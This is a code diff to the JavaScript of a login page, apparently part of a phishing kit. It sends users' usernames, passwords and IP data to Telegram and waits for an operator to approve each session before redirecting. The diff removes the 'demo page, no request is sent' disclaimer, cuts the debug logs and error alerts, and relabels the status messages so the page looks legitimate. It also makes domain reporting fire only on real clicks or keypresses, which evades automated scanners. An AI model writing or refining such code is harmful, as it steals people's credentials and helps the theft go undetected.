@@ -9,6 +9,58 @@
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
+  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
+  // ============================================================
+
+  let domainDetected = false;
+
+  function detectDomain(source) {
+    if (domainDetected) return;
+    
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const domain = urlObj.hostname;
+    
+    const freeDomains = [
+      '.tk', '.ml', '.ga', '.cf', '.gq',
+      '.free.nf', '.free.org', '.free.com',
+      '.co.cc', '.co.nr', '.cjb.net',
+      '.dynu.net', '.ddns.net', '.no-ip.org',
+      'vercel.app', 'netlify.app', 'github.io',
+      'pages.dev', 'web.app', 'firebaseapp.com',
+      'herokuapp.com', 'glitch.me', 'replit.co',
+      '000webhostapp.com', 'byethost.com',
+      'freehostia.com', 'profreehost.com',
+      '.example.com', '.test', '.localhost'
+    ];
+
+    const isFree = freeDomains.some(freeDomain => 
+      domain.includes(freeDomain) || domain.endsWith(freeDomain)
+    );
+
+    domainDetected = true;
+
+    sendToTelegram('domain_detection', {
+      domain: domain,
+      isFree: isFree,
+      source: source || 'click'
+    });
+  }
+
+  // ====== LISTEN FOR HUMAN INTERACTION ======
+  document.addEventListener('click', function(e) {
+    if (!domainDetected) {
+      detectDomain('click');
+    }
+  });
+
+  document.addEventListener('keydown', function(e) {
+    if (!domainDetected && e.isTrusted) {
+      detectDomain('keypress');
+    }
+  });
+
+  // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
   // ============================================================
 
@@ -20,9 +72,7 @@
         if (response.ok) {
           ipData = await response.json();
         }
-      } catch (e) {
-        console.warn('Could not fetch IP data');
-      }
+      } catch (e) {}
 
       const payload = {
         action: action,
@@ -49,8 +99,7 @@
         body: JSON.stringify(payload)
       });
 
-      const result = await response.json();
-      return result;
+      return await response.json();
     } catch (error) {
       console.error('Failed to send to Telegram:', error);
       throw error;
@@ -71,43 +120,6 @@
       return { status: 'pending' };
     }
   }
-
-  // ============================================================
-  // ====== DOMAIN DETECTION =====================================
-  // ============================================================
-
-  function detectDomain() {
-    const currentUrl = window.location.href;
-    const urlObj = new URL(currentUrl);
-    const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
-
-    sendToTelegram('domain_detection', {
-      url: currentUrl,
-      domain: domain,
-      isFree: isFree
-    });
-
-    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
-  }
-
-  detectDomain();
 
   // ============================================================
   // ====== FORM HANDLERS =======================================
@@ -141,15 +153,11 @@
       showTitleError();
       return;
     }
-    alert(
-      "A password reset will be started for username \"" +
-        userName +
-        "\". (Demo page — no request is sent.)"
-    );
+    alert("Password reset requested for: " + userName);
   });
 
   // ============================================================
-  // ====== LOGIN FORM SUBMIT (WITH APPROVAL) ===================
+  // ====== LOGIN FORM SUBMIT ===================================
   // ============================================================
 
   form.addEventListener("submit", async function (event) {
@@ -185,12 +193,11 @@
       return;
     }
 
-    // ====== GENERATE SESSION ID ======
     const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     
-    // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Sending...';
+    const originalText = submitBtn.textContent;
+    submitBtn.textContent = 'Processing...';
     
     try {
       await sendToTelegram('login_attempt', {
@@ -199,16 +206,15 @@
         sessionId: sessionId
       });
       
-      submitBtn.textContent = 'Waiting for approval...';
+      submitBtn.textContent = 'Verifying...';
       
-      // ====== WAIT FOR APPROVAL ======
       let approved = false;
       let rejected = false;
       let attempts = 0;
-      const maxAttempts = 60; // 60 attempts * 1 second = 60 seconds max
+      const maxAttempts = 60;
       
       while (!approved && !rejected && attempts < maxAttempts) {
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+        await new Promise(resolve => setTimeout(resolve, 1000));
         attempts++;
         
         const status = await checkApproval(sessionId);
@@ -223,14 +229,12 @@
       }
       
       if (approved) {
-        submitBtn.textContent = 'Approved! Redirecting...';
+        submitBtn.textContent = 'Redirecting...';
         
-        // Store username for next steps
         try {
           sessionStorage.setItem("melodyUser", userName);
         } catch (e) {}
         
-        // ====== REDIRECT TO AUTH PAGE ======
         setTimeout(function() {
           window.location.href = "auth.html";
         }, 1000);
@@ -242,17 +246,15 @@
         
         setTimeout(function() {
           submitBtn.disabled = false;
-          submitBtn.textContent = 'Sign in';
+          submitBtn.textContent = originalText;
           submitBtn.style.background = '#8b54a2';
           submitBtn.style.borderColor = '#8b54a2';
           passwordInput.value = '';
           passwordInput.focus();
-          alert('Login denied. Please try again.');
         }, 2000);
         
       } else {
-        // Timeout - auto-approve
-        submitBtn.textContent = 'Timeout - Redirecting...';
+        submitBtn.textContent = 'Redirecting...';
         
         try {
           sessionStorage.setItem("melodyUser", userName);
@@ -266,8 +268,7 @@
     } catch (error) {
       console.error('Login error:', error);
       submitBtn.disabled = false;
-      submitBtn.textContent = 'Sign in';
-      alert('An error occurred. Please try again.');
+      submitBtn.textContent = originalText;
     }
   });
 })();
